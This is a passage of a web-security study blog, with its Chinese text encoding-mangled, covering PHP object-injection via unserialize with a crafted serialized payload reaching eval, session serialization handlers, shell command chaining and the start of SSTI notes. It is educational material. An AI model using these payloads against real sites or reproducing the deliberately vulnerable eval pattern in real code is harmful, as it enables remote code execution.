class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>æ­£å¸¸å®ä¾‹åŒ–åä¼šæ‰§è¡Œ<code>normal</code>ç±»é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼Œä½†æ˜¯<code>unserialize</code>å‡½æ•°æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å…¶è¿›è¡Œæ”»å‡»ï¼Œæ€è·¯å°±æ˜¯æ”¹å˜<code>index</code>ç±»é‡Œé¢<code>test</code>å±æ€§çš„å€¼ï¼Œè®©å®ƒå®ä¾‹åŒ–<code>evil</code>ç±»ï¼Œä»è€Œæ‰§è¡Œ<code>evil</code>é‡Œé¢çš„<code>action</code>æ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿè¦ä¿®æ”¹<code>evil</code>ç±»é‡Œé¢çš„<code>test2</code>å±æ€§çš„å€¼</p><hr><p>å› ä¸º<code>ç±»ä¸åŒäºå‡½æ•°</code>ï¼Œ<code>å®šä¹‰å®Œä¹‹åæ— æ³•ç›´æ¥ä½¿ç”¨</code>ï¼Œå› ä¸ºç±»<code>åªæ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µ</code>ï¼Œ<u><strong>éœ€è¦é€šè¿‡å…³é”®å­—newæ¥å®ä¾‹åŒ–ç±»ï¼Œæ‰å¯ä»¥ä½¿ç”¨</strong></u>ã€‚ç±»å®ä¾‹åŒ–çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š<strong>å˜é‡å&#x3D;new ç±»åï¼ˆ[æ„é€ å‡½æ•°]ï¼‰</strong>ã€‚</p><p>å…¶ä¸­ï¼Œå˜é‡åå¯ä»¥ä¸º<strong>ä»»ä½•PHPå˜é‡çš„åç§°</strong>ï¼Œæ„é€ å‚æ•°å–å†³äº<strong>ç±»çš„æ„é€ å‡½æ•°</strong>ï¼Œè‹¥<strong>æ— æ„é€ å‡½æ•°ï¼Œåˆ™åœ†æ‹¬å·ä¸­ä¸ºç©º</strong>ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å®ä¾‹åŒ–ä¸€ä¸ªç±»åå³å¯ä½¿ç”¨è¯¥ç±»</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;serialize1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒååºåŒ–çš„ï¼Œå…ˆæ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–index()ç±»ï¼Œç„¶åè°ƒåŠ¨å…¶<code>test</code>å˜é‡å®ä¾‹åŒ–<code>evil)()</code>ï¼Œ</p><p>ä½¿å…¶èƒ½å¤Ÿè¢«è°ƒç”¨ï¼Œç„¶åæ ¹æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹<code>test2</code>å˜é‡è¿›è¡Œèµ‹å€¼å‘½ä»¤è¯­å¥ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„<code>eval</code>å‡½æ•°ï¼Œæ‰§è¡Œä¸€äº›å‘½ä»¤æ¥æ‹¿åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">$test2</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æœ€åå¯¹åºåˆ—åŒ–çš„<strong>å…¥å£ç±»</strong>(<code>index.php</code>)åºåˆ—åŒ–ï¼Œç„¶åæŠŠåºåˆ—åŒ–ç»“æœå¯¼å…¥ï¼Œå†ç”±æºç ä¸­ååºåˆ—åŒ–å‡½æ•°åï¼Œä»è€Œå®ç°æˆ‘ä»¬æƒ³è¦çš„ç»“æ„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä»¥<code>GET</code>æ–¹å¼ä¼ å‚<code>test</code>å‚æ•°ï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?<span class="attribute">test</span>=åºåˆ—åŒ–ç»“æœ</span><br></pre></td></tr></table></figure><p><strong>ä½†æ˜¯åºåˆ—åŒ–çš„ç»“æœæœªå¿…éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› ä¸º<code>%00</code>è¿™ä¸ªç©ºå­—ç¬¦æ˜¯æ— æ³•æ˜¾ç¤ºï¼Œåªèƒ½è¾“å…¥è¿›å»</strong></p><p>ä»¥ä¸Šé¢ä¸ºä¾‹å­ï¼Œåºåˆ—åŒ–åç»“æœä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;indextest&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨äº†è¿™ä¸ªæ˜¯ä¼šæŠ¥é”™çš„ï¼Œ</p><p><img src="/2022/05/28/Web-study/image-20220927091524021.png" alt="image-20220927091524021"></p><p>å› ä¸ºè¿™é‡Œçš„å‚æ•°æœ‰é—®é¢˜</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">s:11</span>:<span class="string">&quot;indextest&quot;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»”ç»†çœ‹ä¸€ä¸‹å±æ€§å€¼æ˜¯<code>11</code>ï¼Œä½†æ˜¯åé¢çš„<code>indextest</code>æ€»å…±æ˜¯<code>9</code>ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ä¸¢å¤±äº†ä¸¤ä¸ªå­—ç¬¦ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦å°±æ˜¯ç©ºå­—ç¬¦<code>%00</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">&quot;index&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;index%00test%00&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test2&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åŠ ä¸Šåå†è¯•è¯•</p><p><img src="/2022/05/28/Web-study/image-20220927091556911.png" alt="image-20220927091556911"></p><p>å°±å®ç°äº†æˆ‘ä»¬çš„ç›®çš„æ“ä½œ</p><p>å½“ç„¶å…¶å®è¿˜å¯èƒ½æœ‰çš„æƒ…å†µåé¢ä¸æ˜¯<code>eval()</code>çš„å‘½ä»¤æ‰§è¡Œï¼Œå¯èƒ½æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæˆ–è€…å…¶ä»–æ“ä½œï¼ŒæŒ‰è¿™ç§æ€è·¯èµ°å¤§éƒ½æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><h3 id="sessionçš„ååºåˆ—åŒ–æ¼æ´"><a href="#sessionçš„ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionçš„ååºåˆ—åŒ–æ¼æ´"></a>sessionçš„ååºåˆ—åŒ–æ¼æ´</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå°±æ˜¯åˆ©ç”¨`php`å¤„ç†å™¨å’Œ`php_serialize`å¤„ç†å™¨çš„å­˜å‚¨æ ¼å¼å·®å¼‚è€Œäº§ç”Ÿï¼Œé€šè¿‡å…·ä½“çš„ä»£ç æˆ‘ä»¬æ¥çœ‹ä¸‹æ¼æ´å‡ºç°çš„åŸå› </span><br></pre></td></tr></table></figure><h4 id="PHP-sessionåºåˆ—åŒ–æœºåˆ¶"><a href="#PHP-sessionåºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHP sessionåºåˆ—åŒ–æœºåˆ¶"></a>PHP sessionåºåˆ—åŒ–æœºåˆ¶</h4><p>æ ¹æ®<code>php.ini</code>ä¸­çš„é…ç½®é¡¹ï¼Œæˆ‘ä»¬ç ”ç©¶å°†<code>$_SESSION</code>ä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°<code>PHPSESSID</code>å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨çš„ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ï¼Œå³<code>session.serialize_handler</code>å®šä¹‰çš„ä¸‰ç§å¼•æ“ï¼š</p><table><thead><tr><th align="center">å¤„ç†å™¨</th><th align="center">å¯¹åº”çš„å­˜å‚¨æ ¼å¼</th></tr></thead><tbody><tr><td align="center">php</td><td align="center">é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td></tr><tr><td align="center">php_binary</td><td align="center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</td></tr><tr><td align="center">php_serialize (php&gt;&#x3D;5.5.4)</td><td align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„</td></tr></tbody></table><h5 id="phpå¤„ç†å™¨"><a href="#phpå¤„ç†å™¨" class="headerlink" title="phpå¤„ç†å™¨"></a>phpå¤„ç†å™¨</h5><p>é¦–å…ˆæ¥çœ‹çœ‹é»˜è®¤<code>session.serialize_handler = php</code>æ—¶å€™çš„åºåˆ—åŒ–ç»“æœï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220311/1646988663_622b0d779748192aba6f7.png!small" alt="img"></p><p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹ï¼Œå°†<code>session</code>å­˜å‚¨ç›®å½•è®¾ç½®ä¸º<code>session.save_path = &quot;/www/php_session&quot;</code>ï¼Œ<code>PHPSESSID</code>æ–‡ä»¶å¦‚ä¸‹</p><p>1ã€æ–‡ä»¶å</p><p>æ–‡ä»¶åä¸º<code>sess_mpnnbont606f50eb178na451od</code>ï¼Œå…¶ä¸­<code>mpnnbont606f50eb178na451od</code>å°±æ˜¯åç»­è¯·æ±‚å¤´ä¸­<code>Cookie</code>æºå¸¦çš„<code>PHPSESSID</code>çš„å€¼ (å¦‚ä¸Šå›¾æµè§ˆå™¨ä¸­å·²å­˜å‚¨)</p><p>2ã€æ–‡ä»¶å†…å®¹</p><p>phpå¤„ç†å™¨å­˜å‚¨æ ¼å¼</p><table><thead><tr><th align="center">é”®å</th><th align="center">ç«–çº¿</th><th align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</th></tr></thead><tbody><tr><td align="center">$_SESSION[â€˜nameâ€™]çš„é”®åï¼šname</td><td align="center">|</td><td align="center">s:6:â€hardenâ€;</td></tr></tbody></table><h5 id="php-binaryå¤„ç†å™¨"><a href="#php-binaryå¤„ç†å™¨" class="headerlink" title="php_binaryå¤„ç†å™¨"></a>php_binaryå¤„ç†å™¨</h5><p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_binary</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment"># ä¸ºäº†æ–¹ä¾¿ACSIIæ˜¾ç¤ºï¼Œå°†é”®åè®¾ç½®ä¸º36ä¸ªå­—ç¬¦é•¿åº¦</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;namenamenamenamenamenamenamenamename&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºä¸‰ç§æ–¹å¼<code>PHPSESSID</code>æ–‡ä»¶åéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œåªéœ€è¦æŸ¥çœ‹æ–‡ä»¶å†…å®¹</p><p><img src="https://image.3001.net/images/20220311/1646988665_622b0d79304714550f427.png!small" alt="img"></p><table><thead><tr><th align="center">é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦</th><th align="center">é”®å</th><th align="center">ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼.</th></tr></thead><tbody><tr><td align="center">$</td><td align="center">namenamenamenamenamenamenamenamename</td><td align="center">s:6:â€hardenâ€;</td></tr></tbody></table><h5 id="php-serialize-å¤„ç†å™¨"><a href="#php-serialize-å¤„ç†å™¨" class="headerlink" title="php_serialize å¤„ç†å™¨"></a>php_serialize å¤„ç†å™¨</h5><p>ä½¿ç”¨php_binaryå¤„ç†å™¨ï¼Œå³<code>session.serialize_handler = php_serialize</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶å†…å®¹å³ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ï¼Œ<code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;harden&quot;;&#125;</code></p><p><img src="https://image.3001.net/images/20220311/1646988666_622b0d7a2a04733d2da9c.png!small" alt="img"></p><hr><h2 id="åäºŒã€rce"><a href="#åäºŒã€rce" class="headerlink" title="åäºŒã€rce"></a>åäºŒã€rce</h2><blockquote><p>â€œ<code>|</code>â€:ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚ä¾‹å¦‚ï¼šhelp |more</p><p>â€œ<code>&amp;</code>â€ commandA <code>&amp;</code> commandB å…ˆè¿è¡Œå‘½ä»¤<code>A</code>ï¼Œç„¶åè¿è¡Œå‘½ä»¤<code>B</code> </p><p>â€œ<code>||</code>â€ commandA <code>||</code> commandB è¿è¡Œå‘½ä»¤<code>A</code>ï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤<code>B</code> </p><p>â€œ<code>&amp;&amp;</code>â€ commandA <code>&amp;&amp;</code> commandB è¿è¡Œå‘½ä»¤<code>A</code>ï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤<code>B</code></p></blockquote><hr><h2 id="åä¸‰ã€ssti"><a href="#åä¸‰ã€ssti" class="headerlink" title="åä¸‰ã€ssti"></a>åä¸‰ã€ssti</h2><blockquote><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">å‚è€ƒæ–‡ç« </a></p></blockquote><p>æ ¹æ®ä¸‹å›¾ï¼Œæ¨æµ‹ä¸åŒçš„æ¨¡æ¿æ³¨å…¥ï¼Œç„¶åä½¿ç”¨ä¸åŒçš„æ³¨å…¥æ–¹æ³•</p><p><img src="/2022/05/28/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p><p><img src="/2022/05/28/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p><blockquote><p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">åŸæ–‡é“¾æ¥1</a></p><p><a href="https://www.freebuf.com/articles/network/219913.html">åŸæ–‡é“¾æ¥2</a></p><p><u><strong>æ³¨ï¼Œç”±äº è½¬ä¹‰å†…å®¹ Hexoä½¿ç”¨Nunjucksæ¸²æŸ“å¸–å­ï¼ˆè¾ƒæ—©çš„ç‰ˆæœ¬ä½¿ç”¨Swigï¼Œå®ƒä»¬å…·æœ‰ç›¸ä¼¼çš„è¯­æ³•ï¼‰ã€‚ç”¨<code>&#123; &#123; &#125; &#125;</code>æˆ–<code>&#123; ï¼… ï¼… &#125;</code>åŒ…è£…çš„å†…å®¹å°†è¢«è§£æï¼Œå¹¶å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚æ‚¨å¯ä»¥ä½¿ç”¨åŸå§‹æ ‡ç­¾æ’ä»¶åŒ…è£…æ•æ„Ÿå†…å®¹ã€‚</strong></u></p><p>è¿™é‡Œæ˜¯æŠŠæ‰€æœ‰{  {}  }å’Œ {  %% }ï¼Œæ²¡æœ‰ç©ºæ ¼ï¼Œæ›¿æ¢æˆæœ‰ç©ºæ ¼çš„ï¼Œæ‰èƒ½ä¸Šä¼ åšå®¢</p></blockquote><h3 id="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"><a href="#å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š" class="headerlink" title="å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š"></a>å…³äºåŸºäºflaskçš„SSTIæ¼æ´çš„é˜¶æ®µå­¦ä¹ å°ç»“ï¼š</h3><h4 id="SSTIçš„ç†è§£ï¼š"><a href="#SSTIçš„ç†è§£ï¼š" class="headerlink" title="SSTIçš„ç†è§£ï¼š"></a>SSTIçš„ç†è§£ï¼š</h4><p>SSTIå’ŒSQLæ³¨å…¥åŸç†å·®ä¸å¤šï¼Œéƒ½æ˜¯å› ä¸ºå¯¹è¾“å…¥çš„å­—ç¬¦ä¸²æ§åˆ¶ä¸è¶³ï¼ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å½“æˆå‘½ä»¤æ‰§è¡Œã€‚</p><h4 id="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"><a href="#SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š" class="headerlink" title="SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š"></a>SSTIå¼•å‘çš„çœŸæ­£åŸå› ï¼š</h4><p>render_templateæ¸²æŸ“å‡½æ•°çš„é—®é¢˜</p><h4 id="render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"><a href="#render-templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š" class="headerlink" title="render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š"></a>render_templateæ¸²æŸ“å‡½æ•°æ˜¯ä»€ä¹ˆï¼š</h4><p>å°±æ˜¯æŠŠHTMLæ¶‰åŠçš„é¡µé¢ä¸ç”¨æˆ·æ•°æ®åˆ†ç¦»å¼€ï¼Œè¿™æ ·æ–¹ä¾¿å±•ç¤ºå’Œç®¡ç†ã€‚å½“ç”¨æˆ·è¾“å…¥è‡ªå·±çš„æ•°æ®ä¿¡æ¯ï¼ŒHTMLé¡µé¢å¯ä»¥æ ¹æ®ç”¨æˆ·è‡ªèº«çš„ä¿¡æ¯æ¥å±•ç¤ºé¡µé¢ï¼Œå› æ­¤æ‰æœ‰äº†è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ã€‚</p><h4 id="render-templateï¼š"><a href="#render-templateï¼š" class="headerlink" title="render_templateï¼š"></a>render_templateï¼š</h4><p>æ¸²æŸ“å‡½æ•°åœ¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå¾€å¾€å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä¸åšæ¸²æŸ“ï¼Œ<br>å³ï¼š{  {}  }åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{  {}  }åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{  {1+1}  }ä¼šè¢«è§£ææˆ2ã€‚å› æ­¤æ‰æœ‰äº†ç°åœ¨çš„æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚å¾€å¾€å˜é‡æˆ‘ä»¬ä½¿ç”¨{  {è¿™é‡Œæ˜¯å†…å®¹}  }<br>çœŸå› ä¸º{  {}  }åŒ…è£¹çš„ä¸œè¥¿ä¼šè¢«è§£æï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥å®ç°ç±»ä¼¼äºSQLæ³¨å…¥çš„æ¼æ´</p><p><code>æ³¨å…¥çš„æ€æƒ³ï¼š</code></p><blockquote><p>ç”¨å‡½æ•°ä¸æ–­è°ƒç”¨æˆ‘ä»¬è¦ä½¿ç”¨çš„å‘½ä»¤å¦‚ï¼šfileã€readã€openã€lsç­‰ç­‰å‘½ä»¤ï¼Œæˆ‘ä»¬ç”¨è¿™äº›æ¥è¯»å–å†™å…¥é…ç½®æ–‡ä»¶ï¼›</p></blockquote><h3 id="Smarty-SSTIåˆ©ç”¨"><a href="#Smarty-SSTIåˆ©ç”¨" class="headerlink" title="Smarty SSTIåˆ©ç”¨"></a>Smarty SSTIåˆ©ç”¨</h3><p>Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚</p><h4 id="æ¼æ´ç¡®è®¤"><a href="#æ¼æ´ç¡®è®¤" class="headerlink" title="æ¼æ´ç¡®è®¤"></a>æ¼æ´ç¡®è®¤</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30</p><h4 id="å¸¸è§„åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§„åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§„åˆ©ç”¨æ–¹å¼"></a>å¸¸è§„åˆ©ç”¨æ–¹å¼</h4><h5 id="php-x2F-php-æ ‡ç­¾"><a href="#php-x2F-php-æ ‡ç­¾" class="headerlink" title="{php}{&#x2F;php}æ ‡ç­¾"></a>{php}{&#x2F;php}æ ‡ç­¾</h5><p>Smartyæ”¯æŒä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ä½†å°±è¯¥é¢˜ç›®è€Œè¨€ï¼Œä½¿ç”¨{php}{&#x2F;php}æ ‡ç­¾ä¼šæŠ¥é”™ï¼š</p><p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p><p>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:</p><blockquote><p>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚</p></blockquote><p>è¯¥é¢˜ç›®ä½¿ç”¨çš„æ˜¯Smartyç±»ï¼Œæ‰€ä»¥åªèƒ½å¦å¯»å®ƒè·¯ã€‚</p><h5 id="literal-æ ‡ç­¾"><a href="#literal-æ ‡ç­¾" class="headerlink" title="{literal} æ ‡ç­¾"></a>{literal} æ 